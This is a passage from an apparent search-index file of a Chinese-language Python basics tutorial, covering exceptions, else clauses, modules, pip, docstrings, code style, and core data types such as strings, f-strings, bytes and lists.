s = f . read () ... print ( f . closed ) # True \u5f02\u5e38\u4e0e\u5904\u7406 \u00b6 \u4ea7\u751f\u9519\u8bef -> \u629b\u51fa\u5f02\u5e38 -> \u7a0b\u5e8f\u7ed3\u675f raise \u5173\u952e\u5b57\u629b\u51fa\u5f02\u5e38 try-except \u5757\u6355\u83b7\u5f02\u5e38 \u53ef\u4ee5\u6709\u591a\u4e2a except\u3001\u4e0d\u53ef\u4ee5\u6ca1\u6709 except \u540e\u63a5\u5f02\u5e38\u7c7b\uff08\u6ca1\u6709\u5219\u6355\u83b7\u6240\u6709\uff09 as \u5b57\u53e5\u5b58\u4e0b\u5f02\u5e38 finally \u8bed\u53e5 \u4e0d\u7ba1\u662f\u5426\u6709\u5f02\u5e38\u90fd\u4f1a\u8fd0\u884c raise ... raise RuntimeError ( \"...\" ) try : input ( \">>> \" ) except KeyboardInterrupt : print ( \"Good bye\" ) try : print ( 1 / 0 ) except ZeroDivisionError as e : print ( \"can't devide by zero\" ) raise e finally : print ( \"finished\" ) if \u5916\u7684 else \u8bed\u53e5 \u00b6 else \u5757\u4e0d\u4ec5\u4ec5\u8ddf\u7740 if \u624d\u80fd\u4f7f\u7528 for-else for \u5faa\u73af\u7ed3\u675f\u624d\u4f1a\u8fd0\u884c for \u5faa\u73af\u88ab break \u4e86\u4e0d\u4f1a\u8fd0\u884c while-else condition \u4e0d\u6210\u7acb\u9000\u51fa\u624d\u4f1a\u8fd0\u884c \u5faa\u73af\u88ab break \u7ec8\u6b62\u4e86\u4e0d\u4f1a\u8fd0\u884c try-else try \u5757\u4e2d\u6ca1\u6709\u5f02\u5e38\u51fa\u73b0\u624d\u4f1a\u8fd0\u884c else \u5757\u4e2d\u5f02\u5e38\u4e0d\u4f1a\u88ab\u524d\u9762\u7684 except \u6355\u83b7 \u7a0b\u5e8f\u6d41\u8df3\u5230\u5757\u5916\u4e86\u4e0d\u4f1a\u8fd0\u884c\uff08return \u7b49\uff09 for value in lst : ... else : ... while condition : ... else : ... try : ... except ... : ... else : ... \u6a21\u5757\u4e0e\u5bfc\u5165 \u00b6 \u6a21\u5757\u53ef\u4ee5\u662f\u4e00\u4e2a\u5355\u72ec\u7684 .py \u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u6587\u4ef6\u5939 \u6587\u4ef6\u5939\u76f8\u5f53\u4e8e\u5bfc\u5165\u5176\u4e0b __init__.py \u6587\u4ef6 \u6a21\u5757\u4e2d\u6b63\u5e38\u7f16\u5199\u51fd\u6570\u3001\u7c7b\u3001\u8bed\u53e5 \u901a\u8fc7 import \u8bed\u53e5\u5bfc\u5165\u6a21\u5757 import code import code as cd from code import ... from code import * \u5bfc\u5165\u65f6\u76f8\u5f53\u4e8e\u8fd0\u884c\u4e86\u4e00\u904d\u5bfc\u5165\u7684\u4ee3\u7801 ## code.py print ( \"hello\" ) def f (): print ( \"call func in code.py\" ) ... import code # hello code . f () import code as cd # hello cd . f () from code import f # hello f () from code import * # hello f () \u201dmain \u51fd\u6570\u201c \u00b6 \u9632\u6b62\u5bfc\u5165\u65f6\u8fd0\u884c\u4ee3\u7801 \u53ea\u5141\u8bb8\u76f4\u63a5\u8fd0\u884c\u811a\u672c\u65f6\u8fd0\u884c \u901a\u8fc7\u5224\u65ad __name__ \u5982\u679c\u662f\u76f4\u63a5\u8fd0\u884c\uff0c\u5219\u5176\u7b49\u4e8e\u5b57\u7b26\u4e32 __main__ \u5982\u679c\u662f\u88ab\u5bfc\u5165\u7684\uff0c\u5219\u5176\u7b49\u4e8e\u6a21\u5757\u540d ## code.py ... if __name__ == \"__main__\" : print ( \"hello\" ) else : print ( __name__ ) import code # code $ python code.py # hello \u5185\u90e8\u6a21\u5757 \u00b6 python \u81ea\u5e26\u4e86\u5f88\u591a\u5b9e\u7528\u7684\u6a21\u5757\uff08\u6807\u51c6\u5e93\uff09 os\u3001sys\uff1a\u7cfb\u7edf\u64cd\u4f5c math\uff1a\u6570\u5b66\u8fd0\u7b97 re\uff1a\u6b63\u5219\u8868\u8fbe\u5f0f datetime\uff1a\u65e5\u671f\u4e0e\u65f6\u95f4 subprocess\uff1a\u5b50\u8fdb\u7a0b\u7ba1\u7406 argparse\uff1a\u547d\u4ee4\u884c\u53c2\u6570\u89e3\u6790 logging\uff1a\u65e5\u5fd7\u8bb0\u5f55 hashlib\uff1a\u54c8\u5e0c\u8ba1\u7b97 random\uff1a\u968f\u673a\u6570 csv\u3001json\uff1a\u6570\u636e\u683c\u5f0f\u89e3\u6790 collections\uff1a\u66f4\u591a\u7c7b\u578b ... \u770b\u6587\u6863\uff1a docs.python.org/zh-cn/3/library \u5916\u90e8\u6a21\u5757\u5b89\u88c5 \u00b6 pypi.org \u4e0a\u6709\u6781\u591a\u522b\u4eba\u5199\u597d\u4e86\u53ef\u4ee5\u7528\u7684\u6a21\u5757 numpy \u77e9\u9635\u7b49\u79d1\u5b66\u8ba1\u7b97\u3001scipy \u79d1\u5b66\u8ba1\u7b97\u3001matplotlib \u4f5c\u56fe\u2026\u2026 \u4f7f\u7528 pip \u5b89\u88c5\uff08pip / python -m pip\uff09 pip install pkg_name pip install pkg_name=... \u6307\u5b9a\u7248\u672c pip install -r requirements.txt \u5b89\u88c5 txt \u6587\u4ef6\u4e2d\u7684\u6240\u6709\u5305 pip install ... -i https://pypi.tuna.tsinghua.edu.cn/simple \u6362\u6e90 pip list\u3001pip show \u547d\u4ee4\u67e5\u770b\u5b89\u88c5\u7684\u6240\u6709\u5305/\u67d0\u4e2a\u5305\u7684\u4fe1\u606f pip uninstall pkg_name \u5378\u8f7d\u5305 pip \u5b89\u88c5\u672c\u5730\u6a21\u5757 \u76ee\u5f55\u4e0b\u9700\u8981\u5305\u542b setup.py / pyproject.toml pip install . \u5b89\u88c5\u672c\u5730\u6a21\u5757\uff08\u590d\u5236\u5230 site-packages \u4e2d\uff09 pip install -e . \u53ef\u4fee\u6539\u5f62\u5f0f\u5b89\u88c5\u672c\u5730\u6a21\u5757\uff08\u5728\u5f53\u524d\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4ee3\u7801\uff09 \u6587\u6863\u5b57\u7b26\u4e32 \u00b6 \u6a21\u5757\u5f00\u5934\u7684\u4e09\u5f15\u53f7\u5b57\u7b26\u4e32 \u7c7b\u3001\u51fd\u6570\u5b9a\u4e49\u4e0b\u9762\u7684\u4e09\u5f15\u53f7\u5b57\u7b26\u4e32 help(...) \u7684\u65f6\u5019\u53ef\u4ee5\u663e\u793a obj.__doc__ \u8868\u793a\u8fd9\u4e32\u5b57\u7b26\u4e32 \u7f16\u8f91\u5668\u7528\u6765\u63d0\u793a \u4e00\u4e9b\u6587\u6863\u751f\u6210\u5de5\u5177\uff08sphinx \u7b49\uff09\u4ece\u4e2d\u83b7\u53d6\u6587\u6863 \"\"\" docstring for module \"\"\" def func ( ... ): \"\"\"docstring for function\"\"\" ... class A (): \"\"\"docstring for class\"\"\" def __init__ ( self , ... ): \"\"\"docstring for method\"\"\" ... \u4ee3\u7801\u89c4\u8303 \u00b6 PEP\uff1aPython Enhancement Proposals\uff1a peps.python.org PEP 8 \u89c4\u8303\uff0c\u7ed9\u51fa\u4e86\u63a8\u8350\u4f7f\u7528\u7684 python \u4ee3\u7801\u98ce\u683c\u89c4\u8303 peps.python.org/pep-0008 pep8.org \u66f4\u7ec6\u81f4\u7684\u4ee3\u7801\u98ce\u683c black github.com/psf/black flake8 flake8.pycqa.org ... \u66f4\u591a\uff1f \u00b6 \u57fa\u7840 \u300aPython \u7f16\u7a0b\uff1a\u4ece\u5165\u95e8\u5230\u5b9e\u8df5\u300b ISBN 978-7-115-54608-1 Python 3 \u83dc\u9e1f\u6559\u7a0b runoob.com/python3/python3-tutorial.html Python \u5b98\u65b9\u6587\u6863 tutorial docs.python.org/3/tutorial \u4e2d\u56fd\u5927\u5b66 mooc - \u6d59\u6c5f\u5927\u5b66 Python \u7a0b\u5e8f\u8bbe\u8ba1 \u8fdb\u9636 \u300a\u6d41\u7545\u7684 Python\u300b ISBN 978-7-115-45415-7 Python \u5b98\u65b9\u6587\u6863 docs.python.org/3 \u5b66\u4e00\u4e9b\u5b9e\u7528\u7684\u7b2c\u4e09\u65b9\u5e93\uff0c\u770b\u6587\u6863 PEP peps.python.org \uff08\u6ce8\u610f\u5206\u6e05\u6709\u6ca1\u6709\u5b9e\u65bd\uff09 GitHub \u627e\u9879\u76ee\u8bfb","title":"Python \u57fa\u7840\u8bed\u6cd5"},{"location":"cs/pl/python/basic/#python","text":"Abstract \u61d2\u5f97\u518d\u6574\u7406\u4e86\uff0c\u57fa\u672c\u4e0a\u662f\u4e4b\u524d\u4e00\u6b21 Python \u57fa\u7840\u6559\u5b66\u76f4\u64ad\u7684 slides \u6587\u5b57\u5185\u5bb9\uff0c\u5173\u4e8e\u57fa\u7840\u6559\u5b66\uff1a GitHub \u4ed3\u5e93\uff1a TonyCrane/PythonLecture slides\uff1a https://slides.tonycrane.cc/PythonLecture/ \u90e8\u5206\u76f4\u64ad\u56de\u653e\uff1a https://www.bilibili.com/video/BV13Z4y1h7x5/?vd_source=c0de364997e494206a0fb88c9ee8bfb1 \u8fd9\u91cc\u662f\u7eaf\u7684 slides \u6539\u5199\uff0c\u6548\u679c\u6ca1\u6709\u76f4\u63a5\u770b slides \u597d\uff0c\u800c\u4e14\u53ef\u80fd\u6709\u9519\u8bef\uff0c\u53d1\u73b0\u8bf7\u53ca\u65f6\u8bc4\u8bba\u544a\u8bc9\u6211","title":"Python \u8bed\u6cd5\u57fa\u7840"},{"location":"cs/pl/python/basic/#python_1","text":"\u89e3\u91ca\u6027\u7684\u811a\u672c\u8bed\u8a00\uff1a\u901a\u8fc7\u89e3\u91ca\u5668\u6765\u76f4\u63a5\u8fd0\u884c\uff0c\u4e0d\u9700\u8981\u7f16\u8bd1\u94fe\u63a5\u6210\u4e8c\u8fdb\u5236\u6587\u4ef6 \u52a8\u6001\u7c7b\u578b\u8bed\u8a00\uff1a\u7c7b\u578b\u5728\u8fd0\u884c\u65f6\u786e\u5b9a\uff0c\u4e0d\u9700\u8981\u901a\u8fc7\u4ee3\u7801\u660e\u6587\u89c4\u5b9a \u9762\u5411\u5bf9\u8c61\u8bed\u8a00\uff1apython \u4e2d\u4e00\u5207\u7686\u5bf9\u8c61 ...","title":"\u4ec0\u4e48\u662f python"},{"location":"cs/pl/python/basic/#python_2","text":"\u88c5\u7684\u662f\u4ec0\u4e48\uff1f \u662f\u4e00\u4e2a python \u89e3\u91ca\u5668 \uff0c\u4ee5\u53ca\u8fd0\u884c\u9700\u8981\u7684 \u73af\u5883 \u600e\u4e48\u88c5\uff1f \u5b98\u65b9\u7f51\u7ad9 https://www.python.org/downloads/ conda\uff08\u4e00\u4e2a\u597d\u7528\u7684 python \u73af\u5883\u7ba1\u7406\u5de5\u5177\uff09 anaconda \uff08\u5927\u3001\u6709\u9884\u88c5\u73af\u5883\uff09 https://www.anaconda.com/ miniconda \uff08\u5c0f\uff09 https://docs.conda.io/en/latest/miniconda \u6781\u4e0d\u5efa\u8bae\u901a\u8fc7\u5fae\u8f6f\u5e94\u7528\u5546\u5e97\u5b89\u88c5 python \u88c5\u4ec0\u4e48\u7248\u672c\uff1f \u4e24\u4e2a\u5927\u7248\u672c\uff0c2.* \u548c 3.*\uff0c\u5dee\u522b\u8f83\u5927\uff0c\u5efa\u8bae 3.* \u4e00\u4e9b\u5c0f\u7248\u672c\uff0c3.6 \u53ca\u4e4b\u524d\u4e0d\u63a8\u8350\uff0c3.7 3.8 \u7a33\u5b9a\uff0c3.9 3.10 \u5b8c\u5584\u4e2d\uff0c3.11 \u9884\u89c8\u4e2d \u7ec6\u5206\u7248\u672c\uff0c\u9009\u62e9\u6700\u65b0\uff0c3.7.13\u30013.8.13\u30013.9.12\u30013.10.4 conda \u4e0d\u5fc5\u62c5\u5fc3\u7248\u672c\uff0c\u9ed8\u8ba4 3.9\uff0c\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u865a\u62df\u73af\u5883\u6765\u4f7f\u7528\u4e0d\u540c\u7248\u672c","title":"\u600e\u4e48\u88c5 python"},{"location":"cs/pl/python/basic/#python_3","text":"\u600e\u4e48\u7528 python\uff1f \u8bb0\u4f4f\u4f60\u4e0b\u8f7d\u7684\u662f\u4e00\u4e2a\u89e3\u91ca\u5668\uff0c\u5efa\u8bae\u901a\u8fc7\u547d\u4ee4\u884c\u8fd0\u884c python code.py \u4ec0\u4e48\u662f\u547d\u4ee4\u884c\uff1f \u901a\u8fc7\u8f93\u5165\u547d\u4ee4\u6765\u901a\u77e5\u7535\u8111\u6267\u884c\u67d0\u6307\u4ee4\u3001\u6216\u8005\u8fd0\u884c\u67d0\u7a0b\u5e8f Windows\uff1acmd\u3001Powershell -> \u5355\u72ec\u8fd0\u884c / Windows Terminal /... macOS\uff1azsh\u3001... -> \u7ec8\u7aef / iTerm /... Linux\uff1abash\u3001zsh\u3001... -> \u7ec8\u7aef / ... \u7528\u4ec0\u4e48\u5199\u4ee3\u7801\uff1f \u8bb0\u4f4f\u4f60\u7f16\u5199\u7684\u53ea\u662f\u4e00\u4e2a .py \u4f5c\u4e3a\u6269\u5c55\u540d\u7684\u6587\u672c\u6587\u4ef6 \u53ea\u8981\u6587\u672c\u7f16\u8f91\u5668\u90fd\u53ef\u4ee5\u5199 \u8bb0\u4e8b\u672c\u3001\u81ea\u5e26 IDLE\u3001word Notepad++\u3001Sublime Text VSCode\uff08Visual Studio Code\uff0c\u4e0d\u662f VS\uff09 code.visualstudio.com Pycharm\uff08Community Edition \u5c31\u591f\u7528\uff09 jetbrains.com/pycharm","title":"\u600e\u4e48\u7f16\u5199\u3001\u8fd0\u884c python"},{"location":"cs/pl/python/basic/#_1","text":"\u7ed9\u4e00\u4e2a\u5185\u5bb9\u7ed1\u5b9a\u4e00\u4e2a\u6807\u7b7e\u5373\u53d8\u91cf\u540d\uff08\u6ce8\u610f\u8bf7\u4e0d\u8981\u8ba4\u4e3a\u53d8\u91cf\u7c7b\u4f3c\u4e00\u4e2a\u201c\u76d2\u5b50\u201d\uff09 \u901a\u8fc7 = \u6765\u5b9a\u4e49\u53d8\u91cf\uff0c\u53d8\u91cf\u540d = \u5185\u5bb9 \u52a8\u6001\u7c7b\u578b\uff0c\u4e0d\u9700\u8981\u89c4\u5b9a\u7c7b\u578b\uff08\u53ef\u4ee5\u901a\u8fc7 \u53d8\u91cf\u540d: \u7c7b\u578b = \u5185\u5bb9 \u6765\u8fdb\u884c\u7c7b\u578b\u6807\u6ce8\uff09 \u53d8\u91cf\u540d \u53ea\u80fd\u5305\u542b\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u4e0b\u5212\u7ebf\u3001 \u4e2d\u6587 \uff0c\u4e0d\u80fd\u6709\u7a7a\u683c\u548c\u5176\u5b83\u7b26\u53f7 \u53ea\u80fd\u4ee5\u5b57\u6bcd\u3001\u4e0b\u5212\u7ebf\u5f00\u5934\uff0c\u4e0d\u80fd\u4ee5\u6570\u5b57\u5f00\u5934\uff0c\u800c\u4e14\u5927\u5c0f\u5199\u654f\u611f \u4e0d\u80fd\u7528\u5173\u952e\u5b57\uff08\u4f8b\u5982 if def \u7b49\uff09\u4f5c\u4e3a\u53d8\u91cf\u540d\uff0c\u4e0d\u63a8\u8350\u4f7f\u7528\u5185\u7f6e\u51fd\u6570\u540d\u4f5c\u4e3a\u53d8\u91cf\u540d \u6e05\u6670\u660e\u786e\u3001\u98ce\u683c\u7edf\u4e00 \u5168\u5927\u5199\u4e00\u822c\u8868\u793a\u5e38\u91cf\u3001\u4e0d\u5efa\u8bae\u4f7f\u7528\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u6216\u8005\u5f00\u5934\u7ed3\u5c3e\u3001\u4e0d\u5efa\u8bae\u4f7f\u7528 _ \u4f5c\u4e3a\u53d8\u91cf\u540d","title":"\u53d8\u91cf"},{"location":"cs/pl/python/basic/#_2","text":"","title":"\u6570\u636e\u7c7b\u578b"},{"location":"cs/pl/python/basic/#_3","text":"1 \u662f\u6574\u6570\uff0c1. \u662f\u6d6e\u70b9\u6570 \u6574\u6570\u4e0e\u6d6e\u70b9\u6570\u8f6c\u6362 int(...)\uff1a\u5411 0 \u820d\u5165 round(...)\uff1a\u5411\u5076\u820d\u5165\uff08\u56db\u820d\u516d\u5165\u4e94\u51d1\u5076\uff0c\u53ef\u4ee5\u5f53\u6210\u56db\u820d\u4e94\u5165\uff09 math.floor(...)\u3001math.ceil(...)\uff1a\u4e0b\u53d6\u6574\u3001\u4e0a\u53d6\u6574\uff08\u9700\u8981 import math\uff09 \u8fd0\u7b97 + - * \u52a0\u51cf\u4e58\uff0c\u5de6\u53f3\u90fd\u662f\u6574\u6570\u7ed3\u679c\u4e5f\u662f\u6574\u6570\uff0c\u6709\u6d6e\u70b9\u6570\u7ed3\u679c\u5c31\u662f\u6d6e\u70b9\u6570 / \u9664\u6cd5\uff0c\u7ed3\u679c\u662f\u6d6e\u70b9\u6570\uff08\u5373\u4f7f\u53ef\u4ee5\u6574\u9664\uff09 // \u6574\u9664\uff0c\u7ed3\u679c\u662f\u6574\u6570\uff0c\u5411\u4e0b\u53d6\u6574 % \u53d6\u6a21\uff0ca % b == a - (a//b)*b\uff08\u548c c \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\uff09 ** \u4e58\u65b9\uff0c\u53ef\u4ee5\u662f\u6d6e\u70b9\u6570\uff0c\u6bd4\u5982 a ** 0.5 \u8868\u793a\u5f00\u6839\u53f7 pow(a, b, mod)\uff1a\u4e5f\u662f\u4e58\u65b9\uff0cmod \u53ef\u4ee5\u7701\u7565\uff0c\u5982\u679c\u6709 mod \u5219\u5bf9\u7ed3\u679c\u53d6\u6a21\uff0c\u5982\u679c mod \u4e3a -1 \u5219\u8ba1\u7b97\u4e58\u6cd5\u9006\u5143 \u66f4\u591a\u8fd0\u7b97\u901a\u8fc7 math\u3001numpy\u3001scipy \u7b49\u5305\u6765\u8fdb\u884c","title":"\u6570\u5b57\u4e0e\u8fd0\u7b97"},{"location":"cs/pl/python/basic/#_4","text":"python \u4e2d\u5185\u7f6e\u4e86\u590d\u6570\u7c7b\u578b\uff0c1+2j \u5f62\u5f0f\u5c31\u8868\u793a\u4e00\u4e2a\u590d\u6570\uff0c\u5176\u4e2d j \u5373\u865a\u6570\u5355\u4f4d i \u6216\u8005\u4f7f\u7528 complex(\u5b9e\u90e8, \u865a\u90e8) \u5f62\u5f0f\u5b9a\u4e49\u590d\u6570 \u53ef\u4ee5\u8fdb\u884c\u590d\u6570\u7684\u52a0\u51cf\u4e58\u9664\u8fd0\u7b97 \u5c5e\u6027\u4e0e\u65b9\u6cd5 c.real\uff1a\u5b9e\u90e8 c.imag\uff1a\u865a\u90e8 c.conjugate()\uff1a\u8fd4\u56de\u5171\u8f6d\u590d\u6570","title":"\u590d\u6570\u7c7b\u578b"},{"location":"cs/pl/python/basic/#_5","text":"\u5355\u5f15\u53f7 '...'\uff0c\u53cc\u5f15\u53f7 \"...\"\uff0c\u4e09\u5f15\u53f7 '''...''' \"\"\"...\"\"\"\uff08\u53ef\u4ee5\u5185\u90e8\u6362\u884c\uff09 \\n \u6362\u884c\uff0c\\t \u5236\u8868\u7b26\uff0c\\r \u56de\u8f66\uff0c\\' \u5355\u5f15\u53f7\uff0c\\\" \u53cc\u5f15\u53f7\uff0c\\\\ \u659c\u6760\uff08\u53ea\u6253\u4e00\u4e2a \u4f1a\u51fa\u95ee\u9898\uff09\uff0c\u2026\u2026 \u524d\u7f00 r-string\uff1ar\"...\"\uff0c\u5f15\u53f7\u4e2d\u4e0d\u8fdb\u884c\u8f6c\u4e49\uff0c\u5373\u4e00\u4e2a \u5c31\u4ee3\u8868\u659c\u6760\u5b57\u7b26\u672c\u8eab f-string\uff1af\"...\"\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 b-string\uff1ab\"...\"\uff0c\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a bytes\uff0c\u53ea\u80fd\u5305\u542b ASCII \u5b57\u7b26 \u5e38\u7528\u65b9\u6cd5 \u62fc\u63a5\uff1a\u76f4\u63a5\u5c06\u5b57\u7b26\u4e32\u201c\u76f8\u52a0\u201d \"...\".upper()\u3001\"...\".lower()\uff1a\u8f6c\u4e3a\u5168\u5927\u5199\u3001\u5168\u5c0f\u5199 \"...\".title()\uff1a\u5355\u8bcd\u9996\u5b57\u6bcd\u5927\u5199 \"...\".strip()\uff1a\u5220\u9664\u5b57\u7b26\u4e32\u9996\u5c3e\u7a7a\u767d\uff08\u5305\u542b\u7a7a\u683c\u548c\u5236\u8868\u7b26\uff09 \"...\".lstrip()\u3001\"...\".rstrip()\uff1a\u5220\u9664\u5de6\u3001\u53f3\u7aef\u7a7a\u767d \"...\".split(c)\uff1a\u6839\u636e\u5b57\u7b26 c \u6765\u62c6\u5206\u5b57\u7b26\u4e32\u5f97\u5230\u5217\u8868\uff0c\u9ed8\u8ba4\u62c6\u5206\u7a7a\u767d","title":"\u5b57\u7b26\u4e32"},{"location":"cs/pl/python/basic/#f-string","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u65b9\u5f0f\uff1a\"...\" % ...\uff0c\"...\".format(...)\uff0cf\"...\" \u5b57\u7b26\u4e32\u5185\u5927\u62ec\u53f7\u62ec\u8d77\u6765\u7684\u8ba1\u7b97\u540e\u8f6c\u4e3a\u5b57\u7b26\u4e32\u586b\u5165 f\"...{...}...\" \u5982\u679c\u5b57\u7b26\u4e32\u8981\u7528\u5927\u62ec\u53f7\u539f\u59cb\u5b57\u7b26\u8981\u5199\u4e24\u4e2a f\"...{{...\" \u683c\u5f0f\u5316\uff08\u5728\u586b\u5165\u5185\u5bb9\u540e\u9762\u52a0\u5192\u53f7 f\"...{\u8868\u8fbe\u5f0f:\u683c\u5f0f}...\"\uff09 \u5bbd\u5ea6\u586b\u5145\uff1a:[\u586b\u5145\u5b57\u7b26][\u5bf9\u9f50\u65b9\u5f0f][\u5bbd\u5ea6]\uff0c< \u5de6\u5bf9\u9f50\uff0c> \u53f3\u5bf9\u9f50\uff0c^ \u5c45\u4e2d \u5b57\u7b26\u622a\u65ad\uff1a:[...].n\uff0c\u53ea\u663e\u793a\u5b57\u7b26\u4e32\u7684\u524d n \u4e2a\u5b57\u7b26 \u6570\u503c\u7b26\u53f7\uff1a:+ \u6b63\u6570\u52a0\u6b63\u53f7\u3001\u8d1f\u6570\u52a0\u8d1f\u53f7\uff0c:- \u539f\u6837\uff0c: \uff08\u7a7a\u683c\uff09\u6b63\u6570\u52a0\u7a7a\u683c\u3001\u8d1f\u6570\u52a0\u8d1f\u53f7 \u6570\u503c\u7cbe\u5ea6\uff1a:[\u5bbd\u5ea6][\u5206\u9694\u7b26(,_)].[\u7cbe\u5ea6]f\uff0c\u6ca1\u6709\u7cbe\u5ea6\u9ed8\u8ba4\u4e3a 6 \u8fdb\u5236\u663e\u793a\uff1ax \u5c0f\u5199\u5341\u516d\u8fdb\u5236\uff0cX \u5927\u5199\u5341\u516d\u8fdb\u5236\uff0co \u516b\u8fdb\u5236\uff0cb \u4e8c\u8fdb\u5236\uff0c\u52a0 # \u663e\u793a\u524d\u7f00","title":"f-string"},{"location":"cs/pl/python/basic/#_6","text":"\u7c7b\u4f3c\u5b57\u7b26\u4e32\uff0c\u4f46\u5b58\u50a8\u7684\u662f\u5b57\u8282\u7684\u503c\uff0c\u66f4\u50cf\u5217\u8868\uff0c\u663e\u793a\u4e3a b\"...\" \u53ea\u662f\u66f4\u52a0\u6613\u8bfb\u800c\u5df2 b\"...\" \u5219\u8868\u793a\u5b57\u8282\u7c7b\u578b\uff0c\u5176\u4e2d\u53ea\u80fd\u5305\u542b ASCII \u5b57\u7b26\u548c \\x.. \u8868\u793a\u7684\u5341\u516d\u8fdb\u5236\u6570 \u4e0e\u5b57\u7b26\u4e32\u8f6c\u6362 \"...\".encode(encoding) \u6839\u636e encoding \u7f16\u7801\u5b57\u7b26\u4e32\uff0c\u9ed8\u8ba4 UTF-8 bytes_obj.decode(encoding) \u6839\u636e encoding \u89e3\u7801\u5b57\u8282\u5e8f\u5217\uff0c\u89e3\u7801\u5931\u8d25\u4f1a\u62a5\u9519 bytes(\"...\", encoding) \u4e5f\u662f\u6839\u636e encoding \u7f16\u7801\u5b57\u7b26\u4e32 \u4e0d\u8981\u4f7f\u7528 str(b\"...\") \u6765\u5c06\u5b57\u8282\u5e8f\u5217\u8f6c\u4e3a\u5b57\u7b26\u4e32","title":"\u5b57\u8282\u7c7b\u578b"},{"location":"cs/pl/python/basic/#_7","text":"True \u548c False\uff0c\u8bb0\u4f4f\u9996\u5b57\u6bcd\u5927\u5199 \u7528 bool(...) \u6765\u8f6c\u6362\uff0c\u5982\u679c\u662f\u6570\u5b57\u5219\u975e\u96f6\u90fd\u662f True\uff0c\u5982\u679c\u662f\u5b57\u7b26\u4e32\u5219\u975e\u7a7a\u90fd\u662f True \u8fd0\u7b97 \u53ef\u4ee5\u4f7f\u7528 & | \u6765\u8868\u793a\u4e0e\u548c\u6216\uff08\u4f46\u5e76\u4e0d\u4f1a\u77ed\u8def\uff09 \u4e00\u822c\u4f7f\u7528 and or not \u8fdb\u884c\u4e0e/\u6216/\u975e\u8fd0\u7b97\uff08\u4f1a\u77ed\u8def\uff09","title":"\u5e03\u5c14\u7c7b\u578b"},{"location":"cs/pl/python/basic/#_8","text":"\u7c7b\u4f3c\u5176\u5b83\u8bed\u8a00\u7684\u6570\u7ec4\uff0c\u4f46\u662f\u529f\u80fd\u66f4\u591a\uff0c\u800c\u4e14\u5185\u90e8\u5143\u7d20\u4e0d\u8981\u6c42\u540c\u4e00\u7c7b\u578b \u65b9\u62ec\u53f7 [] \u8868\u793a\u5217\u8868\uff0c\u5143\u7d20\u7528\u9017\u53f7\u5206\u9694 \u7d22\u5f15\uff08\u5373\u4e0b\u6807\uff09\u4ece 0 \u5f00\u59cb\u8ba1\u6570\uff0clst[n] \u5373\u8868\u793a\u8bbf\u95ee\u7b2c n+1 \u4e2a\u5143\u7d20 \u7d22\u5f15\u53ef\u4ee5\u662f\u8d1f\u6570\uff0c\u8d1f\u6570\u5373\u8868\u793a\u5012\u6570\uff0c\u4f8b lst[-2] \u8868\u793a\u5012\u6570\u7b2c\u4e8c\u4e2a\u5143\u7d20 \u5207\u7247\uff08\u83b7\u53d6\u5217\u8868\u4e2d\u7684\u4e00\u90e8\u5206\u503c\uff09 lst[a:b]\uff1a\u4ece lst[a] \u5230 lst[b-1] \u7684\u5217\u8868 lst[:b]\uff1a\u4ece\u5f00\u5934\u5230 lst[b-1] \u7684\u5217\u8868 lst[a:]\uff1a\u4ece lst[a] \u5230\u7ed3\u5c3e\u7684\u5217\u8868 lst[:]\uff1a\u8868\u793a\u6574\u4e2a\u5217\u8868\uff08\u62f7\u8d1d\u4e00\u4efd\uff09 lst[a:b:c]\uff1a\u4ece lst[a] \u5230 lst[b-1] \u6bcf c \u4e2a\uff08\u5373\u6b65\u957f\uff09\u53d6\u4e00\u4e2a\u5f62\u6210\u7684\u5217\u8868 c \u53ef\u4ee5\u662f\u8d1f\u6570\uff0c\u6b64\u65f6\u9700\u8981 a > b \u624d\u80fd\u83b7\u53d6\u5230\u503c \u6709\u6b65\u957f\u65f6\u82e5\u7701\u7565 a\u3001b \u8bb0\u5f97\u4e0d\u8981\u7701\u7565\u5192\u53f7\uff0c\u4f8b lst[::-1] \u8868\u793a\u5217\u8868\u5012\u5e8f","title":"\u5217\u8868"},{"location":"cs/pl/python/basic/#_9","text":"\u4fee\u6539\u5143\u7d20\uff1a\u76f4\u63a5\u901a\u8fc7\u7d22\u5f15/\u5207\u7247\uff0c\u7136\u540e\u7b49\u53f7\u8d4b\u503c \u6709\u6808\u7684\u529f\u80fd lst.append(...) \u5728\u5217\u8868\u672b\u5c3e\u52a0\u5165\u5143\u7d20 lst.pop() \u5f39\u51fa\u5217\u8868\u672b\u5c3e\u5143\u7d20\u5e76\u8fd4\u56de \u4efb\u610f\u4f4d\u7f6e\u63d2\u5165\u5f39\u51fa lst.insert(i, x) \u5728\u7d22\u5f15 i \u7684\u4f4d\u7f6e\u63d2\u5165 x\uff0c\u540e\u9762\u4f9d\u6b21\u540e\u79fb lst.pop(i) \u5f39\u51fa\u7d22\u5f15 i \u4f4d\u7f6e\u7684\u5143\u7d20\uff0c\u540e\u9762\u4f9d\u6b21\u524d\u79fb \u5217\u8868\u62fc\u63a5 \u76f4\u63a5\u76f8\u52a0\uff0c\u4e0d\u6539\u53d8\u539f\u5217\u8868\uff0c\u5f97\u5230\u65b0\u7684\u5217\u8868 lst.extend([...])\uff0c\u628a\u4e00\u4e2a\u5217\u8868\u63a5\u5230\u5f53\u524d\u5217\u8868\u540e\u9762 \u6839\u636e\u503c\u5220\u9664\u5143\u7d20 lst.remove(value) \u5220\u9664\u7b2c\u4e00\u4e2a\u503c\u4e3a value \u7684\u5143\u7d20 \u6392\u5e8f\u5217\u8868 lst.sort() \u6c38\u4e45\u6392\u5e8f\uff08\u5373\u6392\u5e8f\u540e\u8d4b\u503c\u7ed9\u5f53\u524d\u5217\u8868\uff09 sorted(lst) \u4e34\u65f6\u6392\u5e8f\uff0c\u8fd4\u56de\u6392\u5e8f\u597d\u7684\u65b0\u5217\u8868 \u9ed8\u8ba4\u4ece\u5c0f\u5230\u5927\uff0c\u5982\u679c\u4f20\u5165 reverse=True \u5219\u4ece\u5927\u5230\u5c0f \u53cd\u8f6c\u5217\u8868 lst.reverse() \u6c38\u4e45\u53cd\u8f6c\uff08\u610f\u4e49\u540c\u4e0a\uff09 